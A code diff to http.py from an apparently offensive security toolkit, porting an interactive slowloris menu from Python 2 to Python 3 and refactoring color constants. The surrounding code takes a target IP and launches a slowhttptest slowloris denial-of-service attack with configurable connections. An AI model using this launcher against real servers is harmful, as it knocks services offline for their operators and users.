@@ -7,6 +7,9 @@ http.py
 
 import subprocess
 
+from .. import consts
+from ..consts import ColorScheme as col
+
 
 SLOWLORIS_MENU = [
     ("target <ip>", "Set the target's IP address"),
@@ -22,7 +25,7 @@ class HTTP(object):
 
     def slowloris(self):
         while True:
-            command = raw_input(LP + "[http] slowloris >> " + W)
+            command = input(col.LP + "[http] slowloris >> " + col.W)
             try:
                 tokenized = command.split(" ")
                 if tokenized[0] == "target":
@@ -42,7 +45,7 @@ class HTTP(object):
 
                 elif tokenized[0] == "start":
                     print("Target IP =>", ip, "\nConnections =>", socket_count, "\nLength =>", length)
-                    confirm = raw_input(LC + "[?] Is the information valid? (y/n) " + W)
+                    confirm = input(col.LC + "[?] Is the information valid? (y/n) " + col.W)
                     if (confirm == "y") or (confirm == "yes"):
                         subprocess.call(["slowhttptest", "-c", str(socket_count), "-H", "-i 10", "-r 200", "-t GET", "-u", str(ip), "-x 24", "-p 3", "-l", str(length)])
                     continue
@@ -51,15 +54,15 @@ class HTTP(object):
                     break
 
             except ValueError:
-                print(WARNING)
+                print(col.WARNING)
                 continue
             except KeyboardInterrupt: # Ctrl + C to go back to main menu
                 break
             except UnboundLocalError:
-                print(R + "[!] Parameters were not set before execution! [!]" + W)
+                print(col.R + "[!] Parameters were not set before execution! [!]" + col.W)
                 continue
 
     def execute(self):
         if self.command == "slowloris":
-            print_command_help(slowloris_menu)
+            consts.print_command_help(SLOWLORIS_MENU)
             self.slowloris()
